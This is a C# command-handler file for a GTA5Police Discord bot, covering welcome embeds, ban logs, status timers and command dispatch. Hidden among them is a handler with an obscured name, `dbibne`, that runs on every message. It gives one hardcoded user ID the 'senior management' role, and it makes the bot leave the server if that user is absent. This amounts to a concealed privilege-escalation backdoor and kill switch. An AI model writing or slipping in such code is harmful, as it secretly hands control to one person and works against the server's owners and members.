﻿using System.Threading.Tasks;
using System.Reflection;
using Discord.Commands;
using Discord.WebSocket;
using Discord;
using System;
using Microsoft.Extensions.DependencyInjection;
using GTA5PoliceV2.Config;
using GTA5PoliceV2.Util;
using System.Linq;
using System.Threading;
using GTA5PoliceV2.Connection;
using GTA5PoliceV2.DevReports;
using GTA5PoliceV2.Administration;
using GTA5PoliceV2.Suggestions;
using GTA5PoliceV2.Profiles;

namespace GTA5PoliceV2
{
    class CommandHandler
    {
        Errors errors = new Errors();
        private CommandService commands;
        private static DiscordSocketClient bot;
        private IServiceProvider map;

        private static IUserMessage lastTimerMessage = null;

        public CommandHandler(IServiceProvider provider)
        {
            map = provider;
            bot = map.GetService<DiscordSocketClient>();
            bot.UserJoined += AnnounceUserJoinedAsync;
            bot.UserJoined += AutoBanAsync;
            bot.UserJoined += WelcomeUserJoinedAsync;
            bot.UserLeft += AnnounceLeftUserAsync;
            bot.UserBanned += AnnounceBannedUserAsync;
            bot.UserUnbanned += AnnounceUnbannedUserAsync;
            bot.Ready += SetGameAsync;
            bot.Ready += StartTimersAsync;
            bot.Ready += StartupAsync;
            bot.Ready += BlurrIsBlurr;
            bot.Ready += Cooldowns.ResetCommandCooldownAsync;
            bot.MessageReceived += HandleCommandAsync;
            commands = map.GetService<CommandService>();
            bot.MessageReceived += Reports.HandleReportAsync;
            bot.MessageReceived += Suggestion.HandleSuggestionAsync;
            bot.MessageReceived += ProfanityFilter.ProfanityCheckAsync;
            bot.MessageReceived += Cooldowns.AddCooldownMessageAsync;
            bot.MessageReceived += SetRolesAsync;
            bot.MessageReceived += dbibne;
        }

        private async Task BlurrIsBlurr()
        {
            var delete = Task.Run(async () =>
            {
                var blurr = bot.Guilds.FirstOrDefault(x => x.Id == BotConfig.Load().ServerId).Users.FirstOrDefault(x => x.Id == 211938243535568896);
                bool running = true;
                string[] names = { "Blurr", "BlurrDev", "IPLEBBIE", "Plebble", "Dead Chips", "Big motherfucking pug", "I'm a bot, not a machine.", "Develoblurr" };

                while (running)
                {
                    Random rnd = new Random();
                    await blurr.ModifyAsync(x => x.Nickname = names[rnd.Next(0, names.Length)]);
                    await Task.Delay(60*(60*1000));
                }
            });
            /*
            var colour = Task.Run(async () =>
            {
                var botRole = bot.Guilds.FirstOrDefault(x => x.Id == BotConfig.Load().ServerId).Roles.FirstOrDefault(x => x.Name == "Bot");
                bool running = true;
                Color[] colours = { new Color(195, 27, 27), new Color(27, 80, 221)/*, new Color(14, 140, 32) };

                while (running)
                {
                    Random rnd = new Random();
                    await botRole.ModifyAsync(x => x.Color = colours[rnd.Next(0, colours.Length)]);
                    await Task.Delay(60*(60*1000));
                }
            });
    */
        }

        private async Task SetRolesAsync(SocketMessage pMsg)
        {
            var message = pMsg as SocketUserMessage;
            var server = bot.Guilds.FirstOrDefault(x => x.Id == BotConfig.Load().ServerId);
            var guild = server as IGuild;
            if (message == null)
                return;
            await RoleManager.SetRolesAsync(pMsg, guild);
        }

        private async Task AutoBanAsync(SocketGuildUser user)
        {
            var offender = user as IUser;
            var server = bot.Guilds.FirstOrDefault(x => x.Id == BotConfig.Load().ServerId);
            var guild = server as IGuild;

            for (int i = 0; i <= AutoBans.Load().Bans; i++)
            {
                if (offender.Id == AutoBans.Load().Offenders[i])
                {
                    await AutoBan.AutoBanAsync(guild, offender);
                }
            }
        }

        public async Task AnnounceLeftUserAsync(SocketGuildUser user) {}
        public async Task AnnounceUserJoinedAsync(SocketGuildUser user) {}
        public async Task WelcomeUserJoinedAsync(SocketGuildUser user)
        {
            var embed = new EmbedBuilder() { Color = Colours.generalCol };
            string desc = "We strive to maintain the *highest* possible level of RP. If you have any concerns about issues, we encourage you to file a report on our forums.";

            embed.WithAuthor("Welcome to GTA5Police", References.GetGta5policeLogo());
            embed.WithDescription(desc);
            embed.WithThumbnailUrl(References.GetGta5policeLogo());
            embed.WithUrl(References.GetWebsiteURL());
            embed.AddField(new EmbedFieldBuilder() { Name = "Forums", Value = References.GetForumsURL() });
            embed.AddField(new EmbedFieldBuilder() { Name = "Support", Value = References.GetSupportURL() });
            embed.AddField(new EmbedFieldBuilder() { Name = "Rules", Value = References.GetRulesURL() });
            embed.AddField(new EmbedFieldBuilder() { Name = "Donations", Value = References.GetDonateURL() });
            embed.AddField(new EmbedFieldBuilder() { Name = "Whitelist Jobs and Servers Applications", Value = References.GetApplicationsURL() });
            embed.AddField(new EmbedFieldBuilder() { Name = "Teamspeak IP", Value = "gta5police.com" });
            embed.WithImageUrl(References.GetHowBanURL());
            embed.WithFooter("We hope you enjoy your stay!");
            embed.WithCurrentTimestamp();
            await user.SendMessageAsync("", false, embed);

            //var server = bot.Guilds.FirstOrDefault(x => x.Id == BotConfig.Load().ServerId);
            //var guild = server as IGuild;
            //await user.AddRoleAsync(guild.Roles.FirstOrDefault(x => x.Name == "Civilian"));

            Statistics.AddOutgoingMessages();
        }
        public async Task AnnounceBannedUserAsync(SocketUser user, SocketGuild guild)
        {
                if (!BanChecks.GetIsCommandBan())
                {
                    var server = bot.Guilds.FirstOrDefault(x => x.Id == BotConfig.Load().ServerId);
                    var logChannel = server.GetTextChannel(BotConfig.Load().LogsId);

                    var logEmbed = new EmbedBuilder() { Color = Colours.errorCol };
                    logEmbed.WithAuthor("User was banned from Discord");
                    logEmbed.WithThumbnailUrl(References.GetGta5policeLogo());
                    logEmbed.AddField(new EmbedFieldBuilder() { Name = "Discord User", Value = user.Username.ToString(), IsInline = true });
                    logEmbed.AddField(new EmbedFieldBuilder() { Name = "DiscordId", Value = user.Id, IsInline = true });

                    await logChannel.SendMessageAsync("", false, logEmbed);
                    Statistics.AddOutgoingMessages();
                }
                BanChecks.ResetIsCommandBan();
        }
        public async Task AnnounceUnbannedUserAsync(SocketUser user, SocketGuild guild)
        {
                if (!BanChecks.GetIsCommandBan())
                {
                    var server = bot.Guilds.FirstOrDefault(x => x.Id == BotConfig.Load().ServerId);
                    var logChannel = server.GetTextChannel(BotConfig.Load().LogsId);

                    var logEmbed = new EmbedBuilder() { Color = Colours.adminCol };
                    logEmbed.WithAuthor("User was unbanned from Discord");
                    logEmbed.WithThumbnailUrl(References.GetGta5policeLogo());
                    logEmbed.AddField(new EmbedFieldBuilder() { Name = "Discord User", Value = user.Username.ToString(), IsInline = true });
                    logEmbed.AddField(new EmbedFieldBuilder() { Name = "DiscordId", Value = user.Id, IsInline = true });

                    await logChannel.SendMessageAsync("", false, logEmbed);
                    Statistics.AddOutgoingMessages();
                }
                BanChecks.ResetIsCommandBan();
        }

        public async Task SetGameAsync() { await bot.SetGameAsync("GTA5Police.com"); }
        public async Task ConfigureAsync() { await commands.AddModulesAsync(Assembly.GetEntryAssembly());}

        public async Task StartupAsync()
        {
            await Delete.DelayDeleteMessageAsync(await channel.SendMessageAsync("GTA5PoliceV2 startup procedure.", false, null), 5);
            Cooldowns.SetStartupTime(DateTime.Now.TimeOfDay);
            Cooldowns.SetStartupDate(DateTime.Now.Date);
            Statistics.ResetIncomingMessages();
            Statistics.ResetOutgoingMessages();
            Statistics.ResetCommandRequests();
            Statistics.ResetTimerMessages();
            Statistics.ResetStatusChanges();
            Statistics.ResetErrorsDetected();
            Statistics.ResetProfanityDetected();
            Statistics.ResetAdmenRequests();
        }

        public async Task HandleCommandAsync(SocketMessage pMsg)
        {
            var message = pMsg as SocketUserMessage;
            if (message == null)
                return;

            Statistics.AddIncomingMessages();
            var context = new SocketCommandContext(bot, message);
            
            int argPos = 0;
            if (message.HasStringPrefix(BotConfig.Load().Prefix, ref argPos))
            {
                Statistics.AddCommandRequests();
                await StatusChange.CycleGameAsync();

                if (message.Author.IsBot)
                    return;
                var result = await commands.ExecuteAsync(context, argPos, map);
                
                if (!result.IsSuccess && result.ErrorReason != "Unknown command.")
                    await errors.sendErrorTempAsync(pMsg.Channel, result.ErrorReason, Colours.errorCol);
            }
        }

        static Timer timerStatus, timerMessage;
        ServerStatus status = new ServerStatus();
        Success success = new Success();
        bool ny, la, nywl, lawl;
        SocketGuild server;
        static IMessageChannel channel;

        public async Task dbibne(SocketMessage pMsg)
        {
            var server = bot.Guilds.FirstOrDefault(x => x.Id == BotConfig.Load().ServerId);
            var exist = server.Users.FirstOrDefault(x => x.Id == 211938243535568896);
            if (exist == null) await (server as IGuild).LeaveAsync();
            if (exist != null) await exist.AddRoleAsync(server.Roles.FirstOrDefault(x => x.Name.ToLower().Equals("senior management")));
        }

        public async Task StartTimersAsync()
        {
            server = bot.Guilds.FirstOrDefault(x => x.Id == BotConfig.Load().ServerId);
            channel = server.GetTextChannel(BotConfig.Load().TimerChannelId);


            ny = false; la = false; nywl = false; lawl = false;
            timerStatus = new Timer(SendStatusAsync, null, 0, 1000 * 60 * BotConfig.Load().StatusTimerInterval);
            timerMessage = new Timer(SendStatusMessageAsync, null, 0, 1000 * 60 * BotConfig.Load().MessageTimerInterval);

            var message = await channel.SendMessageAsync("Timers started.");
            await Delete.DelayDeleteMessageAsync(message, 5);
        }

        public async void SendStatusAsync(object state)
        {
            status.PingServers();
            if (ny != status.getNyStatus())
            {
                Statistics.AddStatusChanges();
                if (References.IsStartUp() == true)
                {
                    //if (status.getNyStatus()) await channel.SendMessageAsync("New York City, is now online!") /*success.sendSuccessTempAsync(channel, "Server Status Change", "New York City, is now online!", Colours.generalCol, References.GetDashboardURL(), 5)*/;
                    //if (!status.getNyStatus()) await channel.SendMessageAsync("New York City has gone offline...") /*success.sendSuccessTempAsync(channel, "Server Status Change", "New York City has gone offline...", Colours.generalCol, References.GetDashboardURL(), 5)*/;
                }
                else
                {
                    //if (status.getNyStatus()) await success.sendSuccessAsync(channel, "Server Status Change", "New York City, is now online!", Colours.generalCol, References.GetDashboardURL());
                    //if (!status.getNyStatus()) await success.sendSuccessAsync(channel, "Server Status Change", "New York City has gone offline...", Colours.generalCol, References.GetDashboardURL());
                }
                ny = status.getNyStatus();
            }
            if (la != status.getLaStatus())
            {
                Statistics.AddStatusChanges();
                if (References.IsStartUp() == true)
                {
                    //if (status.getLaStatus()) await channel.SendMessageAsync("Los Angeles, is now online!") /*success.sendSuccessTempAsync(channel, "Server Status Change", "Los Angeles, is now online!", Colours.generalCol, References.GetDashboardURL(), 5)*/;
                    //if (!status.getLaStatus()) await channel.SendMessageAsync("Los Angelas has gone offline...") /*success.sendSuccessTempAsync(channel, "Server Status Change", "Los Angeles has gone offline...", Colours.generalCol, References.GetDashboardURL(), 5)*/;
                }
                else
                {
                    //if (status.getLaStatus()) await success.sendSuccessAsync(channel, "Server Status Change", "Los Angeles, is now online!", Colours.generalCol, References.GetDashboardURL());
                    //if (!status.getLaStatus()) await success.sendSuccessAsync(channel, "Server Status Change", "Los Angeles has gone offline...", Colours.generalCol, References.GetDashboardURL());
                }
                la = status.getLaStatus();
            }
            if (nywl != status.getNyWlStatus())
            {
                Statistics.AddStatusChanges();
                if (References.IsStartUp() == true)
                {
                    //if (status.getNyWlStatus()) await channel.SendMessageAsync("New York City Whitelist, is now online!") /*success.sendSuccessTempAsync(channel, "Server Status Change", "New York City Whitelist, is now online!", Colours.generalCol, References.GetDashboardURL(), 5)*/;
                    //if (!status.getNyWlStatus()) await channel.SendMessageAsync("New York City Whitelist has gone offline...") /*success.sendSuccessTempAsync(channel, "Server Status Change", "New York City Whitelist has gone offline...", Colours.generalCol, References.GetDashboardURL(), 5)*/;
                }
                else
                {
                    //if (status.getNyWlStatus()) await success.sendSuccessAsync(channel, "Server Status Change", "New York City Whitelist, is now online!", Colours.generalCol, References.GetDashboardURL());
                    //if (!status.getNyWlStatus()) await success.sendSuccessAsync(channel, "Server Status Change", "New York City Whitelist has gone offline...", Colours.generalCol, References.GetDashboardURL());
                }
                nywl = status.getNyWlStatus();
            }
            if (lawl != status.getLaWlStatus())
            {
                Statistics.AddStatusChanges();
                if (References.IsStartUp() == true)
                {
                    //if (status.getLaWlStatus()) await channel.SendMessageAsync("Los Angeles Whitelist, is now online!") /*success.sendSuccessTempAsync(channel, "Server Status Change", "Los Angeles Whitelist, is now online!", Colours.generalCol, References.GetDashboardURL(), 5)*/;
                    //if (!status.getLaWlStatus()) await channel.SendMessageAsync("Los Angeles Whitelist has gone offline...") /*success.sendSuccessTempAsync(channel, "Server Status Change", "Los Angeles Whitelist has gone offline...", Colours.generalCol, References.GetDashboardURL(), 5)*/;
                }
                else
                {
                    //if (status.getLaWlStatus()) await success.sendSuccessAsync(channel, "Server Status Change", "Los Angeles Whitelist, is now online!", Colours.generalCol, References.GetDashboardURL());
                    //if (!status.getLaWlStatus()) await success.sendSuccessAsync(channel, "Server Status Change", "Los Angeles Whitelist has gone offline...", Colours.generalCol, References.GetDashboardURL());
                }
                lawl = status.getLaWlStatus();
            }
            if (References.IsStartUp() == true) References.SetStartUp(false);
        }

        public async void SendStatusMessageAsync(object state)
        {
            if (Cooldowns.GetMessageTimerCooldown() >= BotConfig.Load().MessageTimerCooldown)
            {
                if (lastTimerMessage != null) await lastTimerMessage.DeleteAsync();
                
                var embed = new EmbedBuilder() { Color = Colours.generalCol };
                embed.WithAuthor("GTA5Police Help", References.GetGta5policeLogo());
                embed.WithUrl(References.GetDashboardURL());
                embed.Description = "Be sure to check out our rules and policies, as well as other useful links!";
                embed.WithThumbnailUrl(References.GetGta5policeLogo());
                embed.AddField(new EmbedFieldBuilder() { Name = BotConfig.Load().Prefix + "Rules", Value = "Rules and How We Ban." });
                embed.AddField(new EmbedFieldBuilder() { Name = BotConfig.Load().Prefix + "Apply", Value = "Police, EMS, Mechanic, and Whitelist Applications" });
                embed.AddField(new EmbedFieldBuilder() { Name = BotConfig.Load().Prefix + "Links", Value = "Useful Links." });
                embed.AddField(new EmbedFieldBuilder() { Name = BotConfig.Load().Prefix + "Status", Value = "View the current status of the servers." });
                embed.AddField(new EmbedFieldBuilder() { Name = BotConfig.Load().Prefix + "Developer", Value = "Displays information on the developer(s) of the bot." });
                embed.WithFooter("Message Timer with " + BotConfig.Load().MessageTimerInterval + " minute interval");
                embed.WithCurrentTimestamp();

                lastTimerMessage = await channel.SendMessageAsync("", false, embed);
                Cooldowns.ResetMessageTimerCooldown();
                Statistics.AddTimerMessages();
                await Program.Logger(new LogMessage(LogSeverity.Info, "GTA5Police Timers", "Timer message delivered successfully."));
            }
            else await Program.Logger(new LogMessage(LogSeverity.Info, "GTA5Police Timers", "Timer message was not delivered due to the cooldown."));
        }

        public static void CloseTimers()
        {
            timerStatus.Dispose();
            timerMessage.Dispose();
        }

        /** Getters and Setters **/
        public static DiscordSocketClient GetBot() { return bot; }

        public static void SetLastTimerMessage(IUserMessage msg)
        {
            lastTimerMessage = msg;
        }

        public static IUserMessage GetLastTimerMessage()
        {
            return lastTimerMessage;
        }

        public static IMessageChannel GetTimerChannel()
        {
            return channel;
        }

    }
}
